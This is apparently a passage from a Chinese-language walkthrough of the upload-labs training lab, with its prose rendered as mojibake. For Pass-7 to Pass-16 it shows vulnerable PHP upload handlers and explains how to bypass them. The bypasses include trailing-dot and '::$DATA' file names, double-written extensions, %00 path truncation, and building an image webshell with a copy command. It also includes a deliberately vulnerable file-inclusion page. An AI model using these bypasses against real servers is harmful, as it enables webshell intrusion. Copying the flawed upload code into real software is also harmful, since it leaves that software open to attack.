array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™        $file_ext = str_ireplace('::$DATA', '', $file_ext);//åŽ»é™¤å­—ç¬¦ä¸²::$DATA        $file_ext = trim($file_ext); //é¦–å°¾åŽ»ç©º        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . '/' . $file_name;                $is_upload = true;            }        } else {            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ';        }    } else {        $msg = $UPLOAD_ADDR . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';    }}</code></pre><p>æ²¡æœ‰å¯¹åŽç¼€åæœ«å°¾çš„ç‚¹è¿›è¡Œå¤„ç†ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œä¼šè‡ªåŠ¨åŽ»æŽ‰åŽç¼€åä¸­æœ€åŽçš„â€.â€ï¼Œåœ¨burpä¸­å¯åœ¨åŽç¼€åä¸­åŠ â€.â€ç»•è¿‡ï¼š</p><h2 id="Pass-8-DATAç»•è¿‡"><a href="#Pass-8-DATAç»•è¿‡" class="headerlink" title="Pass-8 ::$DATAç»•è¿‡"></a>Pass-8 ::$DATAç»•è¿‡</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™        $file_ext = trim($file_ext); //é¦–å°¾åŽ»ç©º        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . '/' . $file_name;                $is_upload = true;            }        } else {            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ';        }    } else {        $msg = $UPLOAD_ADDR . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';    }}</code></pre><p>æ²¡æœ‰å¯¹åŽç¼€åä¸­çš„â€™::$DATAâ€™è¿›è¡Œè¿‡æ»¤ã€‚åœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æžœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åŽçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åŽç¼€å.ä¸”ä¿æŒâ€::$DATAâ€ä¹‹å‰çš„æ–‡ä»¶åã€‚åˆ©ç”¨windowsç‰¹æ€§ï¼Œå¯åœ¨åŽç¼€åä¸­åŠ â€ ::$DATAâ€ç»•è¿‡ï¼š</p><p>åœ¨burpä¸­æ”¹ä¸º</p><pre><code>1.php::$DATA</code></pre><h2 id="Pass-9-ç‚¹-ç©ºæ ¼-ç‚¹ç»•è¿‡"><a href="#Pass-9-ç‚¹-ç©ºæ ¼-ç‚¹ç»•è¿‡" class="headerlink" title="Pass-9 ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡"></a>Pass-9 ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™        $file_ext = str_ireplace('::$DATA', '', $file_ext);//åŽ»é™¤å­—ç¬¦ä¸²::$DATA        $file_ext = trim($file_ext); //é¦–å°¾åŽ»ç©º        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . '/' . $file_name;                $is_upload = true;            }        } else {            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ';        }    } else {        $msg = $UPLOAD_ADDR . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';    }}</code></pre><p>ä»£ç å…ˆæ˜¯åŽ»é™¤æ–‡ä»¶åå‰åŽçš„ç©ºæ ¼ï¼Œå†åŽ»é™¤æ–‡ä»¶åæœ€åŽæ‰€æœ‰çš„<code>.</code>ï¼Œå†é€šè¿‡strrcharå‡½æ•°æ¥å¯»æ‰¾<code>.</code>æ¥ç¡®è®¤æ–‡ä»¶åçš„åŽç¼€ï¼Œä½†æ˜¯æœ€åŽä¿å­˜æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰é‡å‘½åè€Œä½¿ç”¨çš„åŽŸå§‹çš„æ–‡ä»¶åï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨1.php. .ï¼ˆç‚¹+ç©ºæ ¼+ç‚¹ï¼‰æ¥ç»•è¿‡</p><h2 id="Pass-10-åŒå†™ç»•è¿‡"><a href="#Pass-10-åŒå†™ç»•è¿‡" class="headerlink" title="Pass-10 åŒå†™ç»•è¿‡"></a>Pass-10 åŒå†™ç»•è¿‡</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = str_ireplace($deny_ext,"", $file_name);        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $file_name)) {            $img_path = $UPLOAD_ADDR . '/' .$file_name;            $is_upload = true;        }    } else {        $msg = $UPLOAD_ADDR . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';    }}</code></pre><p>é»‘åå•è¿‡æ»¤ï¼Œå°†é»‘åå•é‡Œçš„åŽç¼€åæ›¿æ¢ä¸ºç©ºä¸”åªæ›¿æ¢ä¸€æ¬¡ï¼Œå› æ­¤å¯ä»¥ç”¨åŒå†™ç»•è¿‡</p><p>.pphphp(è¿™æ ·è§£æžåŽå°±å˜æˆ.php)å°±ä¸Šä¼ æˆåŠŸ</p><p>æ³¨ï¼šä¸èƒ½å†™æˆ.phphpp,ä¸ç„¶ä¼šè¢«è§£æžæˆ.hpp</p><h3 id="0x12"><a href="#0x12" class="headerlink" title="#0x12"></a>#0x12</h3><h2 id="Pass-11-00æˆªæ–­"><a href="#Pass-11-00æˆªæ–­" class="headerlink" title="Pass-11 00æˆªæ–­"></a>Pass-11 00æˆªæ–­</h2><pre><code>$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $ext_arr = array('jpg','png','gif');    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES['upload_file']['tmp_name'];        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        }        else{            $msg = 'ä¸Šä¼ å¤±è´¥ï¼';        }    }    else{        $msg = "åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»åž‹æ–‡ä»¶ï¼";    }}</code></pre><p>ç™½åå•åˆ¤æ–­ï¼Œä½†$img_pathæ˜¯ç›´æŽ¥æ‹¼æŽ¥ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨%00æˆªæ–­ç»•è¿‡</p><p>æˆªæ–­æ¡ä»¶ï¼š<br> 1ã€phpç‰ˆæœ¬å°äºŽ5.3.4<br> 2ã€php.iniçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</p><p>è¿™ä¸ª%00æˆªæ–­å…¶å®žå’ŒSQLæ³¨å…¥é‡Œçš„æ³¨é‡Šä½œç”¨æ˜¯ä¸€æ ·çš„è®©åŽé¢éƒ¨åˆ†æ²¡æœ‰ä½œç”¨ã€‚</p><p>åœ¨save_path</p><h2 id="Pass-12-00æˆªæ–­"><a href="#Pass-12-00æˆªæ–­" class="headerlink" title="Pass-12 00æˆªæ–­"></a>Pass-12 00æˆªæ–­</h2><pre><code>$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $ext_arr = array('jpg','png','gif');    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES['upload_file']['tmp_name'];        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        }        else{            $msg = "ä¸Šä¼ å¤±è´¥";        }    }    else{        $msg = "åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»åž‹æ–‡ä»¶ï¼";    }}</code></pre><p>save_pathå‚æ•°é€šè¿‡POSTæ–¹å¼ä¼ é€’ï¼Œè¿˜æ˜¯åˆ©ç”¨00æˆªæ–­ï¼Œå› ä¸ºPOSTä¸ä¼šåƒGETå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ï¼Œæ‰€ä»¥éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹</p><p><img src="/2021/07/16/uploadlabs/blog/source_posts\Uploadlabs\pass12.png" alt="pass12"></p><h2 id="Pass-13-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass-13-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass-13 å›¾ç‰‡é©¬ç»•è¿‡"></a>Pass-13 å›¾ç‰‡é©¬ç»•è¿‡</h2><pre><code>function getReailFileType($filename){    $file = fopen($filename, "rb");    $bin = fread($file, 2); //åªè¯»2å­—èŠ‚    fclose($file);    $strInfo = @unpack("C2chars", $bin);        $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);        $fileType = '';        switch($typeCode){              case 255216:                        $fileType = 'jpg';            break;        case 13780:                        $fileType = 'png';            break;                case 7173:                        $fileType = 'gif';            break;        default:                        $fileType = 'unknown';        }            return $fileType;}$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $temp_file = $_FILES['upload_file']['tmp_name'];    $file_type = getReailFileType($temp_file);    if($file_type == 'unknown'){        $msg = "æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼";    }else{        $img_path = $UPLOAD_ADDR."/".rand(10, 99).date("YmdHis").".".$file_type;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        }        else{            $msg = "ä¸Šä¼ å¤±è´¥";        }    }}</code></pre><p>è¯»å–ä¸Šä¼ æ–‡ä»¶ä¸­çš„ä¸¤ä¸ªå­—èŠ‚</p><p>å°†è¯»å–çš„å†…å®¹è§£åŒ…ï¼ˆunpack() å‡½æ•°ä»ŽäºŒè¿›åˆ¶å­—ç¬¦ä¸²å¯¹æ•°æ®è¿›è¡Œè§£åŒ…è¿”å›žæ•°ç»„ä¸€ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå€¼ï¼‰</p><p>è¿”å›žè§£åŒ…åŽçš„æ•´æ•°å€¼ï¼ˆ<strong>intval()</strong> å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›žå˜é‡ var çš„ integer æ•°å€¼ï¼‰</p><h4 id="æ³•ä¸€-1"><a href="#æ³•ä¸€-1" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h4><p>æˆ‘ä»¬åœ¨ä¸€å¥è¯æœ¨é©¬çš„å¼€å¤´æ·»åŠ ä¸¤ä¸ª11ä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶çš„3131ï¼Œå°†<code>HEX</code>ç¼–ç  3131 æ”¹ä¸º FFD8 ç‚¹<code>Go</code>åŽæˆåŠŸä¸Šä¼ <code>JPG</code></p><h4 id="æ³•äºŒ-1"><a href="#æ³•äºŒ-1" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h4><p>åˆ©ç”¨å›¾ç‰‡é©¬ï¼Œå°†ä¸€å¼ æ­£å¸¸çš„å›¾ç‰‡jpgï¼Œå’Œä¸€å¥è¯phpåˆæˆä¸€å¼ æ–°çš„jpgæ–‡ä»¶ï¼Œwindowä¸‹ cmd</p><pre><code>copy 1.jpg /b + 1.php /a shell.jpg</code></pre><p>ç›´æŽ¥è®¿é—®å›¾ç‰‡å¹¶ä¸èƒ½æŠŠå›¾ç‰‡å½“åšPHPè§£æžï¼Œå› æ­¤è¿˜éœ€è¦åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ž</p><pre><code>##include.php&lt;?php/*æœ¬é¡µé¢å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´žï¼Œç”¨äºŽæµ‹è¯•å›¾ç‰‡é©¬æ˜¯å¦èƒ½æ­£å¸¸è¿è¡Œï¼*/header("Content-Type:text/html;charset=utf-8");$file = $_GET['file'];if(isset($file)){    include $file;}else{    show_source(__file__);}?&gt;</code></pre><h2 id="Pass-14-getimagesize-å›¾ç‰‡é©¬"><a href="#Pass-14-getimagesize-å›¾ç‰‡é©¬" class="headerlink" title="Pass-14 getimagesize()-å›¾ç‰‡é©¬"></a>Pass-14 getimagesize()-å›¾ç‰‡é©¬</h2><pre><code>function isImage($filename){    $types = '.jpeg|.png|.gif';    if(file_exists($filename)){        $info = getimagesize($filename);        $ext = image_type_to_extension($info[2]);        if(stripos($types,$ext)&gt;=0){            return $ext;        }else{            return false;        }    }else{        return false;    }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $temp_file = $_FILES['upload_file']['tmp_name'];    $res = isImage($temp_file);    if(!$res){        $msg = "æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼";    }else{        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = "ä¸Šä¼ å‡ºé”™ï¼";        }    }}</code></pre><p>è¿™é¢˜æ˜¯ç”¨getimagesizeå‡½æ•°åˆ¤æ–­æ–‡ä»¶ç±»åž‹ï¼Œè¿˜æ˜¯å¯ä»¥å›¾ç‰‡é©¬ç»•è¿‡ï¼Œæ–¹æ³•åŒpass-13</p><h4 id="getmagicsize"><a href="#getmagicsize" class="headerlink" title="#getmagicsize()"></a>#getmagicsize()</h4><p>ç”¨äºŽèŽ·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›žä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å›ž FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚</p><pre><code>Array(    [0] =&gt; 290    [1] =&gt; 69    [2] =&gt; 3    [3] =&gt; width="290" height="69"    [bits] =&gt; 8    [mime] =&gt; image/png)</code></pre><ul><li><p>ç´¢å¼• 0 ç»™å‡ºçš„æ˜¯å›¾åƒå®½åº¦çš„åƒç´ å€¼</p></li><li><p>ç´¢å¼• 1 ç»™å‡ºçš„æ˜¯å›¾åƒé«˜åº¦çš„åƒç´ å€¼</p></li><li><p>ç´¢å¼• 2 ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»åž‹ï¼Œè¿”å›žçš„æ˜¯æ•°å­—ï¼Œå…¶ä¸­1 = GIFï¼Œ2 = JPGï¼Œ3 = PNGï¼Œ4 = SWFï¼Œ5 = PSDï¼Œ6 =  BMPï¼Œ7 = TIFF(intel byte order)ï¼Œ8 = TIFF(motorola byte order)ï¼Œ9 = JPCï¼Œ10 = JP2ï¼Œ11 = JPXï¼Œ12 = JB2ï¼Œ13 = SWCï¼Œ14 = IFFï¼Œ15 = WBMPï¼Œ16 = XBM</p></li><li><p>ç´¢å¼• 3 ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æŽ¥ç”¨äºŽ HTML çš„ &lt;imageæ ‡ç­¾</p></li><li><p>ç´¢å¼• bits ç»™å‡ºçš„æ˜¯å›¾åƒçš„æ¯ç§é¢œè‰²çš„ä½æ•°ï¼ŒäºŒè¿›åˆ¶æ ¼å¼</p></li><li><p>ç´¢å¼• channels ç»™å‡ºçš„æ˜¯å›¾åƒçš„é€šé“å€¼ï¼ŒRGB å›¾åƒé»˜è®¤æ˜¯ 3</p></li><li><p>ç´¢å¼• mime ç»™å‡ºçš„æ˜¯å›¾åƒçš„ MIME ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯å¯ä»¥ç”¨æ¥åœ¨ HTTP Content-type å¤´ä¿¡æ¯ä¸­å‘é€æ­£ç¡®çš„ä¿¡æ¯ï¼Œå¦‚ï¼š header(â€œContent-type: image/jpegâ€);</p><h4 id="magic-type-to-extesion"><a href="#magic-type-to-extesion" class="headerlink" title="#magic_type_to_extesion()"></a>#magic_type_to_extesion()</h4><p>æ ¹æ®æŒ‡å®šçš„å›¾åƒç±»åž‹è¿”å›žå¯¹åº”çš„åŽç¼€å</p></li></ul><h2 id="Pass-15-exif-imagetype-å›¾ç‰‡é©¬"><a href="#Pass-15-exif-imagetype-å›¾ç‰‡é©¬" class="headerlink" title="Pass-15 exif_imagetype()-å›¾ç‰‡é©¬"></a>Pass-15 exif_imagetype()-å›¾ç‰‡é©¬</h2><pre><code>function isImage($filename){    //éœ€è¦å¼€å¯php_exifæ¨¡å—    $image_type = exif_imagetype($filename);    switch ($image_type) {        case IMAGETYPE_GIF:            return "gif";            break;        case IMAGETYPE_JPEG:            return "jpg";            break;        case IMAGETYPE_PNG:            return "png";            break;            default:            return false;            break;    }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $temp_file = $_FILES['upload_file']['tmp_name'];    $res = isImage($temp_file);    if(!$res){        $msg = "æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼";    }else{        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = "ä¸Šä¼ å‡ºé”™ï¼";        }    }}</code></pre><p>è¿™é‡Œç”¨åˆ°php_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»åž‹ï¼Œç”¨å›¾ç‰‡é©¬ç»•è¿‡ï¼Œæ–¹æ³•åŒpass-13</p><p>#exif_magictype()</p><p>è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚å¦‚æžœå‘çŽ°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›žä¸€ä¸ªå¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å›ž FALSEã€‚</p><p>æ³¨ï¼šéœ€æ‰“å¼€php_exif æ¨¡å—ï¼ŒæŠŠå‰é¢çš„åˆ†å·åŽ»æŽ‰å°±æ‰“å¼€äº†ã€‚</p><h2 id="Pass-16-äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"><a href="#Pass-16-äºŒæ¬¡æ¸²æŸ“ç»•è¿‡" class="headerlink" title="Pass-16 äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"></a>Pass-16 äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])){    // èŽ·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»åž‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„    $filename = $_FILES['upload_file']['name'];    $filetype = $_FILES['upload_file']['type'];    $tmpname = $_FILES['upload_file']['tmp_name'];    $target_path=UPLOAD_PATH.'/'.basename($filename);    // èŽ·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å    $fileext= substr(strrchr($filename,"."),1);    //åˆ¤æ–­æ–‡ä»¶åŽç¼€ä¸Žç±»åž‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ    if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg")){        if(move_uploaded_file($tmpname,$target_path)){            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡            $im = imagecreatefromjpeg($target_path);            if($im == false){                $msg = "è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼";                @unlink($target_path);            }else{                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å                srand(time());                $newfilename = strval(rand()).".jpg";                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åŽçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰                $img_path = UPLOAD_PATH.'/'.$newfilename;                imagejpeg($im,$img_path);                @unlink($target_path);                $is_upload = true;            }        } else {            $msg = "ä¸Šä¼ å‡ºé”™ï¼";        }    }else if(($fileext == "png") &amp;&amp; ($filetype=="image/png")){        if(move_uploaded_file($tmpname,$target_path)){            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡            $im = imagecreatefrompng($target_path);            if($im == false){                $msg = "è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼";                @unlink($target_path);            }else{                 //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å                srand(time());                $newfilename = strval(rand()).".png";                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åŽçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰                $img_path = UPLOAD_PATH.'/'.$newfilename;                imagepng($im,$img_path);                @unlink($target_path);                $is_upload = true;                           }        } else {            $msg = "ä¸Šä¼ å‡ºé”™ï¼";        }    }else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif")){        if(move_uploaded_file($tmpname,$target_path)){            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡            $im = imagecreatefromgif($target_path);            if($im == false){                $msg = "è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼";                @unlink($target_path);            }else{                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å                srand(time());                $newfilename = strval(rand()).".gif";                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åŽçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰                $img_path = UPLOAD_PATH.'/'.$newfilename;                imagegif($im,$img_path);                @unlink($target_path);                $is_upload = true;            }        } else {            $msg = "ä¸Šä¼ å‡ºé”™ï¼";        }    }else{        $msg = "åªå…è®¸ä¸Šä¼ åŽç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼";    }}</code></pre><h4 id="basename-path-suffix"><a href="#basename-path-suffix" class="headerlink" title="#basename(path,suffix)"></a>#basename(path,suffix)</h4><p>å‡½æ•°è¿”å›žè·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>path</td><td>å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„è·¯å¾„ã€‚</td></tr><tr><td>suffix</td><td>å¯é€‰ã€‚è§„å®šæ–‡ä»¶æ‰©å±•åã€‚å¦‚æžœæ–‡ä»¶æœ‰åæœ‰æ–‡ä»¶æ‰©å±•åï¼Œå°†ä¸ä¼šæ˜¾ç¤ºè¿™ä¸ªæ‰©å±•åã€‚</td></tr></tbody></table><p>#imagecreatefrom__()</p><p>è¯¥ç³»åˆ—å‡½æ•°ç”¨äºŽä»Žæ–‡ä»¶æˆ– URL è½½å…¥ä¸€å¹…å›¾åƒï¼Œè¿”å›žä¸€å›¾åƒæ ‡è¯†ç¬¦ï¼Œä»£è¡¨äº†ä»Žç»™å®šçš„æ–‡ä»¶åå–å¾—çš„å›¾åƒã€‚å¤±è´¥è¿”å›ž falseã€‚</p><p>æ³¨ï¼šç¨‹åºé€šè¿‡imagecreatefromjpeg()å‡½æ•°è°ƒç”¨äº†PHP GDåº“ï¼ˆGDåº“ï¼Œæ˜¯phpå¤„ç†å›¾å½¢çš„æ‰©å±•åº“ï¼‰ï¼Œå¯¹å›¾ç‰‡è¿›è¡Œäº†è½¬æ¢ã€‚</p><p>è¯¥ç³»åˆ—å‡½æ•°æœ‰ï¼š</p><p>imagecreatefromgif()ï¼š      åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»Ž GIF æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ<br>imagecreatefromjpeg()ï¼š   åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»Ž JPEG æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ<br>imagecreatefrompng()ï¼š    åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»Ž PNG æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ<br>imagecreatefromwbmp()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»Ž WBMP æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ<br>imagecreatefromstring()ï¼š åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»Žå­—ç¬¦ä¸²ä¸­çš„å›¾åƒæµæ–°å»ºä¸€å‰¯å›¾åƒ</p><h4 id="unlink-filename-context"><a href="#unlink-filename-context" class="headerlink" title="#unlink(filename,context)"></a>#unlink(filename,context)</h4><p>åˆ é™¤æ–‡ä»¶ã€‚</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>filename</td><td>å¿…éœ€ã€‚è§„å®šè¦åˆ é™¤çš„æ–‡ä»¶ã€‚</td></tr><tr><td>context</td><td>å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„çŽ¯å¢ƒã€‚context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚</td></tr></tbody></table><p>å¦‚æžœæˆåŠŸï¼Œè¯¥å‡½æ•°è¿”å›ž TRUEã€‚å¦‚æžœå¤±è´¥ï¼Œåˆ™è¿”å›ž FALSEã€‚</p><h4 id="srand-seed"><a href="#srand-seed" class="headerlink" title="#srand(seed)"></a>#srand(seed)</h4><p>æ’­ä¸‹éšæœºæ•°å‘ç”Ÿå™¨ç§å­ã€‚</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>seed</td><td>å¯é€‰ã€‚ç”¨ seed æ’­ä¸‹éšæœºæ•°å‘ç”Ÿå™¨ç§å­ã€‚</td></tr></tbody></table><p>è‡ª PHP 4.2.0 